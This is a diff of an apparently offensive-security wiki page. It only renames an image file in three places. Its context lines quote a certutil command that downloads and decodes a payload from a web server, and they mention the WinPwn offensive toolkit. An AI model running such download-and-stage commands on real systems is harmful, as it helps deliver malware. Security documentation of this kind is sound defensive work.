@@ -12,7 +12,7 @@
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof is home to all crypto bug bounties.**
 
@@ -329,7 +329,7 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 
 **Detected by defender**
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof is home to all crypto bug bounties.**
 
@@ -590,7 +590,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS console with some offensive
 
 ​
 
-<figure><img src="../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 **HackenProof is home to all crypto bug bounties.**
 
